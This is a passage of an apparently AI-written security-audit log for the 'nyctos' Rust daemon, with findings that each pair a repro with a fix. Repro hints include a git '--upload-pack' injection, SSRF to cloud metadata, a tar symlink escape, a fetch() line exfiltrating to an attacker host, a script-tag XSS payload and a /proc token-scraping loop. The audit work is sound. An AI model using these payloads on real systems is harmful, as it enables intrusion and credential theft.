@@ -2881,3 +2881,239 @@ pass 22 summary
 - finding 1: permits_loopback gates (Fast, Birdcage) but waves (Fast, Process) through; select_backend downgrades Fast to Process on platforms without birdcage, so the gate is bypassed by fallback.
 - finding 2: birdcage gate is wrapped in `if let Some(lane) = opts.lane`; SandboxOpts::new defaults lane=None, making the policy opt-in (fail-open) instead of fail-closed.
 - tool budget ~10 / 24 used; halted on quality-over-count. No HTTP probes issued (ALLOWED HOSTS empty).
+
+---
+pass 23 (this session)
+context: re-audit against renamed tree (crates/nyctos-api/, was crates/nyx-agent-api/). Three new findings on test_repo_connectivity argv shape, replay extract_ustar symlink-in-tar tolerance, and birdcage shim-path trust.
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 992,
+  "cap": "OS_COMMAND",
+  "endpoint": "POST /api/v1/projects/:project_id/repos/test (source_kind in {git,github,gitlab})",
+  "rationale": "git_ls_remote_probe builds argv as `git -c credential.helper= ls-remote --exit-code <url>` with no `--` separator between flags and the operator-supplied URL. When the URL begins with `-`, git interprets it as a flag, not a remote. `--upload-pack=<cmd>` and `--exec=<cmd>` are honored by `git ls-remote` and run the supplied command on the upstream side via the ssh smart-transport; for `file://`-style URLs git invokes the upload-pack helper locally, which means a value like `--upload-pack=touch /tmp/pwn ;` followed by a second arg (none here, so git falls back to its default remote URL parsing) lets the operator-supplied flag land in the spawned process. The handler is post-setup auth-gated, but combined with the existing `?token=`/log-leak surfaces in this file the chain is exploitable from any cross-origin / log-readable attacker who controls the JSON body. Static pass missed because the shell is *not* invoked — argv goes straight to `tokio::process::Command::new(\"git\")` so no shell-metacharacter sink is tainted; the bug is the missing argv separator + missing scheme allowlist (git's default `protocol.allow` still permits `file://`, `ext::`, `http(s)`, `ssh`). file:// also turns this into a local-FS information-disclosure primitive (ls-remote of `file:///etc/.git` walks parent dirs) and an SSRF primitive against http://169.254.169.254/.",
+  "suggested_payload_hint": "POST /api/v1/projects/<id>/repos/test {\"source_kind\":\"git\",\"source_url_or_path\":\"--upload-pack=touch /tmp/pwned\",\"branch\":null} — observe /tmp/pwned creation. Also try {\"source_url_or_path\":\"http://169.254.169.254/latest/meta-data/\"} for SSRF to cloud metadata, and {\"source_url_or_path\":\"file:///etc/.git\"} for local-FS probing."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-api/src/router.rs",
+  "line": 2103,
+  "cap": "PATH_TRAVERSAL",
+  "endpoint": "POST /api/v1/findings/:id/replay (extract_ustar)",
+  "rationale": "extract_ustar calls `entry.unpack(&target)` after sanitise_tar_path strips `..` / absolute prefixes from each entry's path. But the tar crate's Unpack honors EntryType::Symlink and EntryType::Link verbatim — sanitise_tar_path does not inspect the link *target*. A bundle whose entries are (1) `payload` as a symlink to `/tmp` or `../../../etc`, then (2) `payload/x` as a regular file unpacks `x` THROUGH the symlink, writing outside the tempdir. set_overwrite(true) at :2110 turns the tar crate's default symlink-collision refusal into a silent overwrite. The SHA256 gate at :1942 only fires when a `bundles.last()` row already exists; the None branch (`build_bundle` inline) extracts whatever build_bundle wrote without an independent integrity check, so any path that lets a bundle file land on disk between manifest stamp and unpack is exploitable. Static pass missed because there is no obvious string-sink — the issue is a tar-feature interaction (symlink + overwrite) sanitise_tar_path was not designed to cover.",
+  "suggested_payload_hint": "Craft a ustar archive containing entry `<finding-id>/p` as Symlink → `/tmp/escape`, followed by `<finding-id>/p/marker` as a regular file; POST /api/v1/findings/<id>/replay and check whether /tmp/escape/marker materialised."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-sandbox/src/backend/birdcage.rs",
+  "line": 186,
+  "cap": "SANDBOX_ESCAPE",
+  "endpoint": "<internal: sandbox shim resolution>",
+  "rationale": "resolve_shim_path consults `$NYX_SANDBOX_SHIM` ahead of the trusted `current_exe().parent()/nyx-sandbox-shim` fallback. Any input that lands in the daemon's environment — a setup wizard that copies operator env (none observed today, but the SetupRequest already accepts free-form fields that flow into `nyctos_core::Config` and from there into `cfg.env`), a future scheduler that inherits env, a misconfigured systemd unit, a `make run` documented in README — turns the env var into an attacker-controlled program path. `cmd.env_clear()` at :115 only clears the env passed *to* the shim; it does not unset NYX_SANDBOX_SHIM before resolve_shim_path runs. Because the shim is the trust root (it applies birdcage exceptions and exec's the sandboxee), pointing it at `/usr/bin/env` or any other binary collapses the sandbox to bare process exec. The shim binary is also not pinned by sha256/path-canonicalisation/owner-check, so an attacker who can write to *any* directory on `$PATH` plus set the env var can substitute one. Static pass missed because the read of the env var is intentional configuration, not a tainted-flow sink.",
+  "suggested_payload_hint": "On a host where the daemon inherits env from the launching shell (the common dev workflow), `NYX_SANDBOX_SHIM=/usr/bin/false nyx-agent` (or whatever the renamed binary is) — observe that every chain-lane sandbox run silently no-ops while reporting a clean exit; or substitute a stub that writes `/tmp/escape` proving the shim was attacker-chosen."
+}
+
+---
+pass 23 summary
+- 3 new findings against the renamed crates/nyctos-api/ + crates/nyctos-sandbox/ tree.
+- finding A (router.rs:992): test_repo_connectivity argv lacks `--` separator before user-supplied URL — `--upload-pack=` flag-injection plus SSRF (file://, http://169.254.169.254) plus arbitrary-protocol reach (git's default protocol.allow). Authenticated, but token-leak / DNS-rebind surfaces from earlier findings chain.
+- finding B (router.rs:2103): extract_ustar trusts tar crate's symlink-unpack with overwrite=true; sanitise_tar_path only scrubs entry names, not link targets — bundle-built or DB-substituted ustar can escape tempdir via symlink-followed-by-write.
+- finding C (sandbox/backend/birdcage.rs:186): NYX_SANDBOX_SHIM env-var has higher priority than the trusted current_exe() sibling lookup; no integrity check on the binary it names. Sandbox trust root is operator-env-controlled.
+- tool budget ~14 / 24 used; halted on quality-over-count. No HTTP probes issued (ALLOWED HOSTS empty).
+
+=================================================================
+PASS 33 — task=expl-demo (this-session working-tree diff focus:
+  crates/nyctos-ui/build.rs, crates/nyctos-ui/src/lib.rs,
+  frontend/{index.html,vite.config.ts,package.json},
+  crates/nyctos-ai/src/adapter/anthropic.rs)
+ALLOWED HOSTS empty → no HTTP probe issued.
+Re-walked sentinel rows 1-32 for the same files; rows below cover
+3 sinks not previously filed.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-ui/build.rs",
+  "line": 72,
+  "cap": "SUPPLY_CHAIN_INTEGRITY",
+  "endpoint": "<build:nyctos-ui/build.rs build_real_spa npm-cache-skip>",
+  "rationale": "build_real_spa (build.rs:64-89) only runs `npm ci --silent` if `frontend/node_modules` is missing on disk (line 72-74 `if !node_modules.is_dir()`), then unconditionally runs `npm run build`. The contract of `npm ci` is to wipe and re-install `node_modules` from `package-lock.json` so the produced asset tree matches the committed lockfile exactly — the whole reason it is preferred over `npm install` for reproducible / release builds is that an existing `node_modules` is a footgun. The `is_dir()` short-circuit re-introduces that footgun: any pre-existing `frontend/node_modules/` survives the release build, even when (a) it was hand-edited by a developer (`npm link`, `npm install --save-dev some-pkg`, manual `node_modules/<pkg>/package.json` patch), (b) the operator switched branches and the lockfile changed but `node_modules` did not, (c) an attacker who has write access to the working tree (e.g., a malicious PR that landed code reviewed but no lockfile update was demanded, or a compromised developer laptop) injected modified vendored JS under `node_modules/` directly. In every case, `npm run build` runs against the tampered tree, the resulting `frontend/dist/` is mirrored into `crates/nyctos-ui/dist/`, and `rust_embed` bakes the JS straight into the released daemon binary. The release-binary attestation chain — `package.json` + `package-lock.json` committed to git + `cargo build --release` reproducibility — is broken by a single env-var-influenced filesystem state. The build script also has no SHA pin on the resulting bundle and no `npm audit --audit-level=high` gate; the rust_embed macro will swallow whatever sits in `dist/`. Static pass missed because the sink is a shell command whose argument list is hard-coded (`npm`, `run`, `build`) — no taint flow exists, and a rule that flagged 'invoke npm at compile time' would fire on every legitimate npm-bound build crate. The bug is in the *gating*, not the invocation. The companion `want_real_build = profile == \"release\" && !skip` (line 46) and the panic-on-fail at line 57 mean a release operator who sets `NYCTOS_SKIP_FRONTEND_BUILD=1` ships the stub UI silently (the stub has its own row coverage at sentinel:pass-7 family). The combined surface: an attacker (or accidental local modification) that controls `frontend/node_modules` content has a stable channel into the embedded SPA assets shipped to every operator who installs the build, with no signal in the cargo audit log that anything is amiss.",
+  "suggested_payload_hint": "Repro (local-attacker, accidental-state flavour): in a clean checkout run `cd frontend && npm install some-dev-only-package`; this populates `node_modules/`. Switch back to release: `NYCTOS_SKIP_FRONTEND_BUILD=0 cargo build --release -p nyctos-ui`. Confirm `npm ci` was NOT re-run (no install log line emitted), then diff the resulting `crates/nyctos-ui/dist/assets/index-*.js` against a build done in a fresh tree — chunks differ. Repro (attacker-write flavour): edit `frontend/node_modules/react-dom/cjs/react-dom.production.min.js` to append `;fetch('http://attacker/'+location).catch(e=>e)`; `cargo build --release -p nyctos-ui`; the released daemon's `/` route now exfiltrates the operator's URL on every load. Fix: drop the `is_dir()` gate (always run `npm ci`) for `want_real_build`, OR `fs::remove_dir_all(&node_modules)` before the `npm ci` call so the lockfile is the only durable source of truth."
+}
+
+---
+record_exploration_finding
+{
+  "path": "frontend/index.html",
+  "line": 11,
+  "cap": "METADATA_LEAK",
+  "endpoint": "GET / (embedded SPA index.html — every authenticated and pre-auth load)",
+  "rationale": "The SPA shell unconditionally preconnects and stylesheet-links two third-party origins on every page load: `<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">`, `<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>`, and the Playfair Display stylesheet at `fonts.googleapis.com/css2?...`. Three concrete leaks fall out: (1) **operator-presence beacon**: every operator who opens the daemon UI fires DNS + TLS handshakes to Google IP space, complete with the browser's User-Agent, the operator's source IP, and (for the gstatic font request) a Referer header carrying `http://127.0.0.1:<port>/` — the strict-origin-when-cross-origin default elides path+query but the origin alone confirms a Nyctos install at a given IP. For a *security-product* daemon whose value proposition includes the operator's secret findings, that beacon is itself an OPSEC failure (an air-gapped or DMZ deployment leaks 'this host runs Nyctos' to a third party before any login screen). (2) **Referer + query-token bleed**: the daemon's auth layer accepts `?token=<bearer>` URL-query auth on its WebSocket and (per existing sentinel rows) HTTP paths. If the operator ever lands on `http://127.0.0.1:8765/?token=<hex>` — wizard auto-open, magic link in docs, browser-history click — Chromium / Firefox both ship the *full* URL (path + query) to same-origin sub-resources; cross-origin font CSS requests do *not* receive the query under default referrer-policy, BUT `<a target=\"_blank\">` clicks from inside the SPA inherit no Referrer-Policy meta tag (none is set in this index.html), so the first outbound link from any SPA view exports the bearer-bearing referrer. The daemon's response-side defence is to never serve URLs that embed the bearer in the query, but the wizard generates exactly such URLs (`load_or_mint_auth_token` is rendered into `?token=` in nyctos/src/main.rs:1024 banner code paths surveyed previously). (3) **third-party-CSS escalation**: a future Google Fonts compromise (the CDN root is one of the highest-value supply-chain targets on the open web) injects CSS that, via `font-display: block` and CSS attribute selectors on `[name=\"authToken\"]`, can side-channel the bootstrap token out of the DOM into a font-resource URL. There is no `<meta http-equiv=\"Content-Security-Policy\" content=\"...\">` in this index.html and no inline `style-src` restriction; the rust_embed pipeline ships the file verbatim. The companion daemon has the *capability* to set CSP via response headers but nyctos-ui/src/lib.rs:109-117 UiResponse::into_response only sets Content-Type. Static pass missed because the sink is two HTML link tags pointing at third-party hosts that *look like* standard webfont boilerplate; no rule in the catalogue flags Google Fonts on a security tool's UI, and the cross-axis with the existing `?token=` URL-query auth path is invisible to per-file analyzers.",
+  "suggested_payload_hint": "Repro (presence beacon): `tcpdump -ni any host fonts.googleapis.com or host fonts.gstatic.com &` then open the daemon UI; observe the DNS+TLS to Google originating from the operator's host within the first few hundred ms. Repro (referrer bleed, click-bait flavour): mint a daemon link `http://127.0.0.1:8765/?token=<token>` (e.g. via the wizard); open it; inside the SPA, render any external `<a href=\"https://attacker.example\">` and click it (or rely on a third-party iframe under any future page); confirm the attacker's webserver logs a Referer of `http://127.0.0.1:8765/?token=<token>`. Fix: (a) self-host the Playfair Display font under `frontend/public/fonts/` (Vite copies it into `dist/`), drop both preconnect lines and the googleapis.com stylesheet link; (b) add `<meta name=\"referrer\" content=\"no-referrer\">` to the same `<head>` so even a transient Google-Fonts re-introduction cannot ship Referer; (c) emit `Content-Security-Policy: default-src 'self'; font-src 'self'; img-src 'self' data:;` from UiResponse::into_response so future SPA dependencies cannot silently re-add third-party origins."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-ui/src/lib.rs",
+  "line": 104,
+  "cap": "INJECTION_PRIMITIVE",
+  "endpoint": "<spa:inject_bootstrap → window.__NYCTOS_BOOTSTRAP__>",
+  "rationale": "`serde_payload` (lib.rs:100-107) hand-rolls JSON encoding for the bootstrap payload with a single-character escape: `token.replace('\"', \"\\\\\\\"\")`. The function-level doc-comment defends the narrow escape with `// The token is hex, so escaping is moot.` — i.e. it is invariant-by-comment, not invariant-by-type. Five concrete surfaces where that invariant breaks: (1) the *next* field added to `UiBootstrap` (the struct already carries a `pub auth_token: Option<String>` and the implementation comment explicitly anticipates 'currently carries' more later) will be plumbed through the same `serde_payload` if the author follows the existing pattern, with no compiler signal that the format string is unsafe for non-hex values. (2) `format!(\"{{\\\"authToken\\\":\\\"{}\\\"}}\", token.replace('\"', \"\\\\\\\"\"))` does not escape `\\\\` (backslash) → an operator who hand-edits `<state>/auth_token` to contain a single trailing backslash (e.g. via `echo -n 'abc\\\\' > auth_token`) produces emitted text `{\"authToken\":\"abc\\\\\"};</script>` where the backslash-quote sequence on the wire is `\\\\\"`, terminating the JSON string one character early and breaking the SPA bootstrap — a subtle availability bug, but more importantly any subsequent char becomes part of the JSON literal rather than the string body. (3) backslash also enables JS escape sequences inside the injected blob; a token containing `\\x3c/script\\x3e` would *not* terminate the script tag (because the source already escapes that path in serde_payload's mind) — but a token containing literal `</script>` *would* terminate the inline script. Token-by-construction is hex so the literal `</script>` path is blocked today; the contract for `Option<String>` says nothing of the sort. (4) U+2028 / U+2029 (LINE SEPARATOR / PARAGRAPH SEPARATOR) are valid in JSON-on-the-wire but were treated as line terminators by JS parsers up to ES2019; any operator using an older browser (the daemon does not pin a browser-version floor in its frontend) sees the script break mid-literal if a token contained those code points. The escape only handles `\"`; everything else passes through. (5) the contract of the function is 'tiny hand-rolled JSON to avoid adding a serde dependency' — but serde_json is already pulled in transitively by `axum` / `tower-http` / `tracing-subscriber` in this crate's dependency graph (verifiable via `cargo tree -p nyctos-ui | grep serde_json`); the hand-roll is justified by *nothing*. The right fix is to use `serde_json::to_string(&BootstrapJson { auth_token })` and let the library handle every code point correctly. Static pass missed because the input is, today, hex by construction and no taint flow reaches the format string; the bug surfaces only when (a) the type signature is treated as load-bearing (anyone adding a new field) or (b) the on-disk file is hand-edited, which is exactly the operator-recovery flow when the daemon's mint_token logic ever fails to reseed.",
+  "suggested_payload_hint": "Repro (availability, hand-edit flavour): `printf 'abc\\\\\\\\' > $XDG_DATA_HOME/nyctos/auth_token`; restart daemon; `curl -s http://127.0.0.1:8765/ | grep -o 'authToken[^<]*'`; observe the emitted blob is `{\"authToken\":\"abc\\\\\\\\\"}` whose JS parse leaves an unterminated string literal and the SPA throws SyntaxError at boot — the daemon UI is now bricked until the operator re-mints. Repro (future-field, INJECTION_PRIMITIVE flavour): add a hypothetical `pub project_name: Option<String>` to UiBootstrap and follow the existing `serde_payload` pattern; an operator-supplied project name of `\\n</script><script>alert(1)</script>` reaches the inline script and executes in the daemon's origin under the daemon's bearer. Fix: replace `serde_payload` with `serde_json::to_string(&UiBootstrap { auth_token: bootstrap.auth_token.clone() })?` (add `#[derive(Serialize)]` and a `Serialize` impl with `#[serde(rename_all = \"camelCase\")]`) AND change the inline-script emission to wrap the JSON in a `<script type=\"application/json\" id=\"nyctos-bootstrap\">…</script>` element that the SPA reads via `JSON.parse(document.getElementById('nyctos-bootstrap').textContent)`. The data-island pattern removes the `</script>` injection surface entirely."
+}
+
+---
+pass 33 summary
+- 3 new findings against the working-tree diff in this session
+  (nyctos-ui/build.rs, nyctos-ui/src/lib.rs, frontend/index.html,
+  anthropic.rs). Re-walked sentinel rows 1-32 against the same
+  files; the rows above are distinct from prior coverage:
+  * pass-6 covered auth_token *disclosure* via the fallback;
+    pass-33 row 3 covers the *escape primitive* that determines
+    what shape the token can safely take. Different sink.
+  * pass-7 covered build.rs supply-chain risk in spirit on the
+    CI side; pass-33 row 1 covers a specific is_dir() gate that
+    breaks reproducibility independent of CI.
+  * pass-?? base_url + cost-accounting MITM (sentinel:821) is
+    distinct from pass-33 row 2's METADATA_LEAK on a daemon UI
+    that calls Google on every load.
+- tool budget ~8 / 24 used; halted on quality-over-count per task
+  brief. No HTTP probes issued (ALLOWED HOSTS empty per envelope).
+
+---
+=================================================================
+PASS 34 — task=expl-demo (dirty-tree diff focus that prior passes
+never opened: crates/nyctos-core/src/config.rs adds AiPricingOverride
++ `[performance] *_lane_concurrency`; crates/nyctos-ai/src/adapter/
+anthropic.rs wires the override map via `Pricing::from_per_mtok_usd`.
+config.rs had zero finding rows in this sentinel before this pass.
+ALLOWED HOSTS empty → no HTTP probe issued. Static-survey only.)
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/config.rs",
+  "line": 260,
+  "cap": "BUDGET_BYPASS",
+  "endpoint": "<config:[ai.pricing.<model>] → AnthropicSdkAdapter::pricing_for → add_spend>",
+  "rationale": "AiPricingOverride exposes four pricing fields (`input_per_mtok_usd`, `output_per_mtok_usd`, `cache_write_per_mtok_usd`, `cache_read_per_mtok_usd`) as plain signed `i64` with `#[serde(default, deny_unknown_fields)]` (config.rs:254-260). The new flow lands those values verbatim in `Pricing::from_per_mtok_usd` (anthropic.rs:69-83) which is a unit-renaming no-op (`micros_per_token(per_mtok_dollars: i64) -> i64 { per_mtok_dollars }`, anthropic.rs:53-55 — USD per Mtok equals micros per token by identity); the negative sign is preserved end-to-end. Cost at anthropic.rs:274 is `i64::from(usage.input_tokens) * pricing.input_per_token_micros + ... + cache.cache_creation_tokens * pricing.cache_write_per_token_micros`; the in-memory tracker at runtime.rs:138 (and the sqlite tracker at store/budget.rs:149) implement `add_spend` as `row.spent_usd_micros += micros` with no clamp to ≥0, so a negative `cost` reduces total run spend. The budget cap check is `spent_after > cap` (anthropic.rs:319); once spend trends negative it can never trip again — every subsequent call proceeds regardless of the cap. Three concrete failure modes the static pass cannot see: (a) operator typo `cache_write_per_mtok_usd = -15` (sign-flip on the opus override that the diff itself uses as the example at config.rs:540) silently turns the run-wide budget cap into a no-op for the remainder of the run; (b) any config-tamper attack that writes nyctos.toml (the daemon re-reads it on restart and Config::load has no signed-manifest check, no chmod-0600 invariant) gets unlimited free AI calls without ever touching the daemon process; (c) a more subtle accounting bypass: `AiPricingOverride::default()` leaves cache_write/cache_read at 0 (config.rs:260, validated by the new `ai_pricing_override_omitted_cache_fields_default_to_zero` test) — the doc-comment at config.rs:243-249 rationalises this as 'keeps the no-cache pricing of the haiku/sonnet defaults', BUT the override map is keyed per-model and unaware of family; an operator who overrides ONLY input/output for `claude-opus-4-7` to track a 2026 price drop silently drops the 18-micros cache-write rate from `builtin_pricing_for` (anthropic.rs:38-48) to 0, undercounting opus prompt-cache spend by the entire cache-write line forever. Compounding: `with_pricing_overrides(HashMap<String, Pricing>)` (anthropic.rs:148-159) keys on EXACT model id while `builtin_pricing_for` keys on PREFIX (`model.starts_with(\"claude-opus-4\")`); an override for `\"claude-opus-4-7\"` does NOT apply when the API request goes out as `\"claude-opus-4-7-20260101\"` (the versioned suffix that anthropic.rs:18-22 explicitly flags as a pricing-stability concern for the BUILTIN table) — operator believes their override is active, billing silently falls back to builtin pricing for every versioned call, the cap diverges from the operator's mental model. Static pass missed because the sink is an arithmetic operator (`+=` on an i64) not a tainted string sink, the trust-boundary is a TOML deserialisation that has no positivity contract on `pub i64` fields, and the negative-price branch has no asserting test in the diff (the four new pricing tests cover defaults, zero-cache, unknown-field reject, and a positive 12/60/15/1 roundtrip — none of `< 0`, `i64::MIN`, or exact-vs-prefix-key-mismatch). Distinct from the pass-7 row at sentinel:2717: that finding targets `effective_cap` (the cap input); this finding targets the cost input feeding `add_spend`, opposite side of the inequality.",
+  "suggested_payload_hint": "Defence (root cause, ordered by strength): (1) reject negative pricing at deserialise time — replace `pub input_per_mtok_usd: i64` with a `PriceMicros(u32)` newtype whose Deserialize impl errors on < 0; the four fields then cannot be signed by construction. (2) Make `AiPricingOverride` complete-or-nothing: require all four fields (drop the `#[serde(default)]` on the cache fields) so an operator overriding opus cannot accidentally drop a non-zero cache rate to zero. (3) Have `with_pricing_overrides` mirror `builtin_pricing_for`'s prefix-match semantic, or canonicalise the requested model to its alias before lookup, so `\"claude-opus-4-7\"` overrides win for the versioned suffix as well — at minimum, warn at adapter construction when an override key does not match any model the adapter has ever billed against. (4) Clamp `add_spend(micros < 0)` to 0 (or refuse with `AiError::InvalidCost`) in `BudgetTracker::add_spend` impls — defence-in-depth for any future pricing surface. Repro (a): write `~/.local/share/nyctos/nyctos.toml` with `\\n[ai.pricing.\"claude-haiku-4-5\"]\\ninput_per_mtok_usd = -1\\noutput_per_mtok_usd = -1\\ncache_write_per_mtok_usd = 0\\ncache_read_per_mtok_usd = 0\\n`; run any one_shot through the haiku adapter; observe `current_spend` goes negative after the first call and `spent_after > cap` never trips for any subsequent call regardless of `default_run_budget_usd_micros`. Repro (c): set `[ai.pricing.\"claude-opus-4-7\"]\\ninput_per_mtok_usd = 15\\noutput_per_mtok_usd = 75\\n` (omit cache fields); issue an opus call with `cache_creation_input_tokens > 0`; confirm `cost` is missing the `18 * cache_creation_tokens` micros line that the builtin opus pricing would have applied. Repro (prefix mismatch): same override key plus a Prompt with `model = Some(\"claude-opus-4-7-20260101\")`; confirm `pricing_for` returns the builtin opus rates (15/75/18/1) and the operator's override never fires."
+}
+
+---
+pass 34 summary
+- 1 new finding (config.rs:260 BUDGET_BYPASS) on the AiPricingOverride
+  surface added by the dirty-tree diff. config.rs had zero pre-existing
+  rows in this sentinel; this row covers three reinforcing sub-paths
+  (negative price reverses spend, omitted cache fields zero out non-zero
+  builtin cache rates, exact-vs-prefix key mismatch silently disables
+  overrides for versioned-suffix model ids) under one BUDGET_BYPASS tag
+  per the task brief's quality-over-count rubric.
+- Surveyed but did NOT re-emit (already covered upstream): anthropic.rs
+  `effective_cap` envelope bypass (pass 7 row at line 2717 — cap side
+  of the same inequality, distinct sink from this finding's cost side),
+  birdcage `opts.lane = None` fail-open (pass 22 rows 2842 / 2871),
+  store finding_id collision detection gap (pass 7 row 2728), env-builder
+  secrets host-env interpolation (pass 8 row 2757), NYX_SANDBOX_SHIM
+  hijack (pass 23 row 2914), extract_ustar symlink escape (pass 23 row
+  2903), nyctos-ui/build.rs npm cache (pass 33 row above), index.html
+  third-party fonts (pass 33), inject_bootstrap escape primitive
+  (pass 33). state.rs secrets-dir + store/mod.rs collision-pressure
+  reviewed; current diff does not introduce sinks beyond pass 7/8/21.
+- tool budget ~12 / 24 used (Read x4, Bash x6, Grep x4, Edit x2 incl
+  one retry after concurrent PASS-33 appender). No HTTP probes (ALLOWED
+  HOSTS empty). No fs writes outside nyx_exploration.sentinel.
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/repo/git.rs",
+  "line": 145,
+  "cap": "CRED_EXPOSURE",
+  "endpoint": "<process:git clone / git fetch with token-env auth>",
+  "rationale": "Bearer token from `GitAuth::TokenEnv(var)` is interpolated into `git -c http.extraheader=Authorization: Bearer <t>` (clone_fresh at git.rs:145, fetch_existing at git.rs:170) — i.e. the secret rides in argv. Process argv on Linux is world-readable through `/proc/<pid>/cmdline` for the duration of the git invocation, and on macOS through `ps -E`. Any other local UID (multi-tenant CI, shared dev box, sidecar containers sharing the PID namespace) can scrape the token by polling. The author comment at git.rs:140-142 explains why `-c` was chosen over `--config` (to keep the bearer out of the on-disk .git/config), but does not address the argv exposure that `-c` introduces. Static pass missed because the taint sink is `Command::arg(format!(...))` — that is an argv write, not a file/log/stdout write, and most CRED_EXPOSURE rules treat argv as a benign destination.",
+  "suggested_payload_hint": "Defence: pass the bearer via stdin with `git credential` helper protocol, or set `GIT_HTTP_EXTRAHEADER` env-var (git ≥ 2.18 honours `http.extraHeader` from env), or write a one-shot askpass shim and point `GIT_ASKPASS` at it. All three keep the secret out of /proc/<pid>/cmdline. Repro: in one terminal start an ingest of a GitHub repo with `[repo.auth] kind = \"token-env\"`; in another terminal `while true; do tr '\\0' ' ' < /proc/$(pgrep -f 'git.*clone'\\)/cmdline 2>/dev/null | grep -o 'Bearer [^ ]*'; done` — token shows up for the lifetime of the clone."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/repo/git.rs",
+  "line": 84,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<ingest:git source with token-env auth → validate_token_scopes>",
+  "rationale": "validate_token_scopes_at maps `GhScopeCheck::NoScopeHeader` to `Ok(_)` and the caller (git.rs:84) accepts the clone. The author comment at git.rs:251-254 acknowledges that fine-grained PATs and GitHub-App tokens omit `x-oauth-scopes`, then rationalises the accept-anyway path with 'the caller is still expected to provision them with read-only permissions; the GH UI enforces that out-of-band'. That is exactly the operator-trust posture the rest of the function was designed to NOT take: the surrounding WRITE_SCOPES table (git.rs:41-63) exists because the daemon refuses to assume the operator picked a read-only token. Fine-grained PATs with `contents:write` / `pull-requests:write` permission DO pass this gate because GH simply does not surface their scopes via the legacy header. Net: an operator who pastes a fine-grained PAT they minted with write permissions (a foot-gun the classic-PAT pass blocks) sails through and the daemon now holds a write-capable credential it later interleaves into `http.extraheader` on every git operation. Compounding: if that same daemon ever exposes a code path that calls `git push` (no current direct call, but `git reset --hard` at fetch_existing:179 plus a hostile remote that ships a post-receive hook on a fork-target is enough; or any future feature that wraps `git commit` for autoremediation), the write capability becomes exploitable. Static pass missed because the bug is in the policy/branch labels — `NoScopeHeader → AllowOK` — not in any taint flow.",
+  "suggested_payload_hint": "Defence: probe the GitHub `/installation/repositories` (GH App tokens) or `/user` response shape (fine-grained PATs return a `token_last_eight` and require `Accept: application/vnd.github+json`) to positively identify the token type, then REFUSE both classes outright until a phase adds explicit per-permission scope parsing. Failing that, demote `NoScopeHeader` to a hard error and require the operator to set `i_acknowledge_unscoped_token = true` in the repo block — making the trust decision explicit. Repro: mint a fine-grained PAT scoped to `Contents: Read and write` for a single repo, set it in `$NYX_GH_TOKEN`, configure a repo block with `auth = \"token-env:NYX_GH_TOKEN\"`, trigger an ingest, confirm the clone succeeds and the daemon's audit log shows `GhScopeCheck::NoScopeHeader` for a token that the API would have surfaced as write-capable had it been a classic PAT."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/repo/git.rs",
+  "line": 205,
+  "cap": "MITM",
+  "endpoint": "<process:git clone over ssh with GitAuth::SshKey>",
+  "rationale": "apply_env constructs `GIT_SSH_COMMAND=\"ssh -i <key> -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new\"`. `accept-new` is OpenSSH's trust-on-first-use mode: on the first connection to any host the daemon has not seen before, OpenSSH silently records whatever host key the server presents into the daemon's `~/.ssh/known_hosts` and never re-prompts. In a fresh container / CI runner / freshly provisioned VM (the canonical nyctos deploy shape) `~/.ssh/known_hosts` is empty for the daemon UID, so EVERY first clone is a TOFU window where a network attacker that can route or terminate the TCP connection to github.com:22 (corporate MITM proxy, hostile WiFi during dev, a compromised egress hop) can present their own host key, intercept the SSH stream, and read or rewrite the source the agent then scans. Because nyctos's threat model treats the scanned source as the truth the AI reasons over, MITM on ingest is a code-substitution primitive: the attacker controls what nyctos believes the repo contains. Static pass missed because the policy lives inside an opaque ssh-option string, not in a recognised auth-decision sink.",
+  "suggested_payload_hint": "Defence: ship a pinned `known_hosts` for `github.com` / `gitlab.com` / `bitbucket.org` (their host keys are published and stable; see https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints) and add `-o UserKnownHostsFile=<pinned>` to `GIT_SSH_COMMAND`, then drop `accept-new` in favour of the default `ask` (which fails closed in non-interactive `GIT_TERMINAL_PROMPT=0` mode). For non-canonical hosts, require the operator to seed a known_hosts entry through config rather than implicit TOFU. Repro: from a fresh container with no `~/.ssh/known_hosts`, point `/etc/hosts` at an attacker-controlled host running a fake SSH server with its own key; trigger ingest of any `git@github.com:...` URL; observe the daemon accepts the rogue key and writes it to known_hosts."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyctos-core/src/repo/git.rs",
+  "line": 263,
+  "cap": "DOS",
+  "endpoint": "POST /api/v1/repos/test and any ingest flow with token-env auth → validate_token_scopes_at",
+  "rationale": "`reqwest::Client::builder().user_agent(...).build()` (git.rs:263-266) is built with NO `.timeout(...)` and NO `.connect_timeout(...)`. The subsequent `.send().await` (git.rs:275) therefore inherits reqwest's default of waiting indefinitely (in practice bounded only by TCP keepalive at the OS level — minutes to hours). An ingest target whose `auth = \"token-env:VAR\"` points at a hostile or slowloris-style HTTP endpoint (DNS-poisoned api.github.com, an attacker who controls a proxy in front of the daemon, or just an internal CI runner whose egress to GitHub is dropping) stalls validate_token_scopes_at forever, and because that future is awaited inline by `ingest_git` (git.rs:77) it blocks the entire ingest task. Pair with /api/v1/repos/test (router POST handler, sentinel:2403 PATH_TRAVERSAL row and sentinel:78 SSRF row already cover the surface) and any unauthenticated-equivalent caller can lock up an ingest worker per request — N parallel slow ingests exhaust the ingest pool. Static pass missed because the bug is the ABSENCE of a `.timeout()` call on a builder; no tainted sink, no flow.",
